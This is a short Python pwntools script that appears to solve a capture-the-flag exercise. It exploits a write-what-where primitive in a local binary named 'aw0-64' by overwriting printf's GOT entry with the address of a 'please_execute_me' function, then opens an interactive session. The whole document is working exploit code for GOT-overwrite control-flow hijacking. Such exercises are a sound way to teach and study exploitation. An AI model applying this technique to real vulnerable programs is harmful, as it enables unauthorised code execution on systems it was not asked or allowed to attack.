#!/usr/bin/env python

from pwn import *
from pwn import info, p64, process

p = process("./aw0-64")

printf_got = p.elf.got["printf"]
target_address = p.elf.symbols["please_execute_me"]
info("target: " + hex(target_address))

# "How many bytes do you want to write (N, in decimal, max 128 bytes)?"
print(p.recvuntil("bytes)?\n"))
p.sendline("6")

# "What is the address that you want to write (A, in hexadexmial, e.g., 0xffffde01)?"
print(p.recvuntil(")?\n"))
p.sendline(hex(printf_got))

# "Please provide your input (MAX %d bytes)\n",
print(p.recvuntil("bytes)\n"))
p.sendline(p64(target_address))

p.interactive()
